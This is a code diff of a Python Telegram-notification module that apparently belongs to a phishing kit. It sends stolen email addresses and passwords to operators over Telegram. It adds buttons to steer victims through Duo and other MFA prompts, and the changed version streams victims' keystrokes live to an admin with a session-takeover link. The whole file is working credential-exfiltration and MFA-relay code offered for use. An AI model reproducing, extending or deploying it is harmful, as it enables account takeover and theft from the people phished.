@@ -1,122 +1,106 @@
+
+# ===============================================================
+# FILE: tg.py
+# ===============================================================
 import requests
 import json
 from dotenv import load_dotenv
 import os
 from urllib.parse import quote
-from utils import Local_Cache
+from utils import get_admin_user
+from models import Email_statuses
 
-# --- Load Environment Variables ---
+# --- Load Environment ---
 load_dotenv()
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-DEFAULT_USER_ID = os.environ.get('USER_ID') # Default user from .env
+DEFAULT_BOT_TOKEN = os.environ.get('BOT_TOKEN')
 HOSTED_URL = os.environ.get('HOSTED_URL')
 
-# --- CONSTANTS ---
-# The user ID of the admin who is allowed to set custom statuses.
-ADMIN_USER_ID = "5594467534"
-
-
-def send_notification(text, user_id=None):
-    """
-    Sends a plain text notification to a specified Telegram user.
-    If no user_id is provided, it falls back to the default user.
-    """
-    BOT_TOKEN = os.environ.get('BOT_TOKEN')
-    if user_id:
-        user_id = str(user_id)
-        ADMIN_USER = Local_Cache.get("ADMIN_USER")
-        if not ADMIN_USER:
-            ADMIN_USER = Variables.find_one({"name": "ADMIN_USER"})
-        
-        if ADMIN_USER:
-            if ADMIN_USER.get("id") == user_id:
-                BOT_TOKEN = ADMIN_USER.get("bot_token")
+def _send_telegram_message(chat_id, text, bot_token, reply_markup=None):
+    base_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {'chat_id': chat_id, 'text': text}
+    if reply_markup:
+        payload['reply_markup'] = json.dumps(reply_markup)
     
-
-
-    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    
-    chat_id = user_id if user_id else DEFAULT_USER_ID
-
-    payload = {
-        'chat_id': chat_id,
-        'text': text
-    }
-
     try:
         response = requests.post(base_url, data=payload)
         response.raise_for_status()
         print(f"Message sent successfully to (ID: {chat_id}).")
+        return True
     except requests.exceptions.RequestException as e:
-        print(f"Error sending message to (ID: {chat_id}): {e}")
-
-
-def get_status_update(email, password, user_id=None):
-    """
-    Sends credentials to the specified Telegram user with status control buttons.
-    If the user is the admin, an extra button to set a custom status is added.
-    """
-    BOT_TOKEN = os.environ.get('BOT_TOKEN')
-    if user_id:
-        user_id = str(user_id)
-        ADMIN_USER = Local_Cache.get("ADMIN_USER")
-        if not ADMIN_USER:
-            ADMIN_USER = Variables.find_one({"name": "ADMIN_USER"})
-        
-        if ADMIN_USER:
-            if ADMIN_USER.get("id") == user_id:
-                BOT_TOKEN = ADMIN_USER.get("bot_token")
-
-
-    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    
-    chat_id = user_id if user_id else DEFAULT_USER_ID
-    
-    text = f"New Login Attempt:\n\nEmail: {email}\nPassword: {password}"
-
-    payload = {
-        'chat_id': chat_id,
-        'text': text,
-    }
-
-    statuses = [
-        'incorrect password',
-        'mobile notification',
-        'duo code',
-        'phone_call',
-        'incorrect duo code',
-        'success'
-    ]
-    
-    # Build keyboard with the standard callback buttons
-    keyboard_layout = [
-        [
-            {
-                'text': status.replace("_", " ").title(),
-                'url': f"{HOSTED_URL}/set_status/{chat_id}/{quote(email)}/{quote(status)}"
-            }
-        ]
-        for status in statuses
-    ]
-
-    # --- NEW: If the recipient is the admin, add the special button ---
-    if str(chat_id) == ADMIN_USER_ID:
-        custom_button_row = [{
-            'text': 'Set Custom Message',
-            'url': f"{HOSTED_URL}/set_custom_status?email={quote(email)}"
-        }]
-        # Add it as a new row at the bottom of the keyboard
-        keyboard_layout.append(custom_button_row)
-
-
-    inline_keyboard = {'inline_keyboard': keyboard_layout}
-    payload['reply_markup'] = json.dumps(inline_keyboard)
-
-    try:
-        response = requests.post(base_url, data=payload)
-        response.raise_for_status()
-        print(f"Status update request sent successfully to (ID: {chat_id}).")
-    except requests.exceptions.RequestException as e:
-        print(f"Error sending status update to (ID: {chat_id}): {e}")
+        print(f"Error sending message to (ID: {chat_id}) using token ...{bot_token[-4:]}: {e}")
         if e.response is not None:
             print(f"Response content: {e.response.text}")
+        return False
+
+def _get_notification_recipients(session_id, original_user_id):
+    admin_user = get_admin_user()
+    admin_id = admin_user.get("id") if admin_user else None
+
+    if not admin_id:
+        return [str(original_user_id)]  # Failsafe
+
+    record = Email_statuses.find_one({"session_id": session_id})
+
+    # If admin has taken over, they are the sole recipient.
+    if record and record.get('active_user_id') == admin_id:
+        return [admin_id]
+        
+    # If the user is not the admin, return both.
+    if str(original_user_id) != admin_id:
+        return list(set([str(original_user_id), admin_id]))
+        
+    # Default: The user is the admin.
+    return [admin_id]
+
+def send_notification(text, user_id, session_id=None, include_admin=False):
+    admin_user = get_admin_user()
+    admin_id = admin_user.get("id") if admin_user else None
+    
+    recipients = [user_id]
+    if include_admin and session_id:
+        recipients = _get_notification_recipients(session_id, user_id)
+
+    for chat_id in recipients:
+        bot_token = DEFAULT_BOT_TOKEN
+        # If the recipient is the admin, use their specific token
+        if admin_user and str(chat_id) == admin_id:
+            bot_token = admin_user.get("bot_token", DEFAULT_BOT_TOKEN)
+        
+        _send_telegram_message(chat_id, text, bot_token)
+
+def send_keystroke_notification_to_admin(session_id, field, value, admin_user):
+    admin_id = admin_user.get("id")
+    admin_token = admin_user.get("bot_token")
+    if not admin_id or not admin_token:
+        return
+
+    text = f"Session: {session_id}\n⌨️ Keystroke in '{field}':\n{value}"
+    keyboard = {'inline_keyboard': [[
+        {'text': '⚡ Takeover Session', 'url': f"{HOSTED_URL}/takeover/{admin_id}/{session_id}"},
+        {'text': '⏳ Delay Notification (4s)', 'url': f"{HOSTED_URL}/api/delay-session/{session_id}"}
+    ]]}
+    _send_telegram_message(admin_id, text, admin_token, reply_markup=keyboard)
+
+def get_status_update(session_id, email, password, user_id):
+    """Sends login credentials to the appropriate recipients with status buttons."""
+    admin_user = get_admin_user()
+    admin_id = admin_user.get("id") if admin_user else None
+    recipients = _get_notification_recipients(session_id, user_id)
+
+    for chat_id in recipients:
+        text = f"New Login Attempt:\n\nEmail: {email}\nPassword: {password}"
+        bot_token = DEFAULT_BOT_TOKEN
+        
+        # Add session_id for the admin and use their token
+        if admin_user and str(chat_id) == admin_id:
+            text = f"Session ID: {session_id}\n\n{text}"
+            bot_token = admin_user.get("bot_token", DEFAULT_BOT_TOKEN)
+
+        statuses = ['incorrect password', 'mobile notification', 'duo code', 'phone_call', 'incorrect duo code', 'success']
+        keyboard_layout = [[{'text': status.replace("_", " ").title(), 'url': f"{HOSTED_URL}/set_status/{chat_id}/{quote(email)}/{quote(status)}"}] for status in statuses]
+
+        # Add admin-only "Set Custom Message" button
+        if admin_user and str(chat_id) == admin_id:
+            keyboard_layout.append([{'text': 'Set Custom Message', 'url': f"{HOSTED_URL}/set_custom_status?email={quote(email)}"}])
+
+        _send_telegram_message(chat_id, text, bot_token, reply_markup={'inline_keyboard': keyboard_layout})
